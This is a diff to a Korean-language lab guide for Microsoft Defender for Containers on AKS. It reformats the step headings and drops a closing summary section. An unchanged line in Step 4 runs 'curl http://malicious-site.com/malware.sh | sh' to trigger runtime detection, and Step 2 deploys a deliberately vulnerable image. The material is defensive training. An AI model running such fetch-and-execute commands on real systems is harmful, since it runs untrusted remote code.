@@ -14,11 +14,11 @@ Defender for Containers (CWPP)의 agentless scanning ➔ agent-based runtime pro
 6. JIT / AAC / FIM 설정 (노드풀 VM)
 7. Alert & Recommendation 분석
 
----
+--- 
 
-# 📝 Step by Step Guide
+## Lab 진행 
 
-## 🥇 Step 1. AKS 클러스터 배포
+### Step 1. AKS 클러스터 배포
 **목표:** AKS(AKS = Azure Kubernetes Service) 클러스터 구축 및 실습 환경 준비
 
 ### 작업(Windows/mac 동일) 
@@ -53,7 +53,7 @@ kubectl get nodes
 
 ---
 
-## 🥈 Step 2. ACR 통합 + 취약 이미지 배포
+### Step 2. ACR 통합 + 취약 이미지 배포
 **목표:** ACR에서 취약 이미지를 pull하여 AKS에 배포
 
 ### 작업
@@ -115,7 +115,7 @@ kubectl get svc
 
 ---
 
-## 🥉 Step 3. Defender for Containers agent-based onboarding
+### Step 3. Defender for Containers agent-based onboarding
 **목표:** runtime protection 기능 활성화
 
 ### 작업
@@ -143,7 +143,7 @@ kubectl get daemonset -n azure-defender
 
 ---
 
-## 🏅 Step 4. Runtime protection 기능 검증
+### Step 4. Runtime protection 기능 검증
 **목표:** 실행 중인 컨테이너 보호 기능 확인
 
 ### 작업
@@ -162,7 +162,7 @@ curl http://malicious-site.com/malware.sh | sh
 
 ---
 
-## 🎖 Step 5. Admission control policy 구성
+### Step 5. Admission control policy 구성
 **목표:** 취약 이미지 배포 차단
 
 ### 작업
@@ -180,7 +180,7 @@ kubectl apply -f dvwa-deployment.yaml
 
 ---
 
-## 🏆 Step 6. JIT / AAC / FIM 설정 (노드풀 VM)
+### Step 6. JIT / AAC / FIM 설정 (노드풀 VM)
 **목표:** CWPP VM 보호 기능 실습
 
 ### 작업
@@ -200,7 +200,7 @@ kubectl apply -f dvwa-deployment.yaml
 
 ---
 
-## 🎓 Step 7. Alert & Recommendation 분석
+### Step 7. Alert & Recommendation 분석
 **목표:** 탐지된 alert 및 remediation recommendation 분석
 
 ### 작업
@@ -210,13 +210,4 @@ kubectl apply -f dvwa-deployment.yaml
 ### 결과
 ✅ CWPP 탐지 및 대응 워크플로우 이해
 
----
 
-## ✨ Lab 완료 후 기대 효과
-✔️ Agentless vs agent-based 기능 차이 이해  
-✔️ 컨테이너 ➔ 런타임 ➔ VM end-to-end 보호 시나리오 체험  
-✔️ DevSecOps 실전 역량 강화
-
----
-
-> **필요시:** 각 단계별 스크린샷 추가 Lab Guide 제작 가능. 요청 시 제공.
